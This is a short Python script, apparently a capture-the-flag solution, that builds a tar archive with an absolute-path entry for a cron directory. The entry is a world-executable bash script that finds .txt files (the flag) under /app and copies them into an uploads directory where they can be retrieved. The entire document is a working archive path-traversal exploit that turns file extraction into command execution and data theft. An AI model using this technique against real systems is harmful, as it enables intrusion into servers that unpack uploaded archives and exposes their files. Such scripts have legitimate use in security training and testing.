import tarfile
import io

tar = tarfile.TarFile('malicious.tar', 'w')

info = tarfile.TarInfo("/etc/cron.custom/cleanup-cron")

# we have to use the find command, since we do not know the name of the flag file...
deserialization_payload = b"#!/bin/bash\nmkdir /app/uploads/abcdef1234567890 && find /app -maxdepth 1 -name '*.txt' -type f ! -name 'requirements.txt' -exec cat {} > /app/uploads/abcdef1234567890/abcdef1234567890 \;"

info.size=len(deserialization_payload)
info.mode=0o777 # like chmod 777

tar.addfile(info, io.BytesIO(deserialization_payload))
tar.close()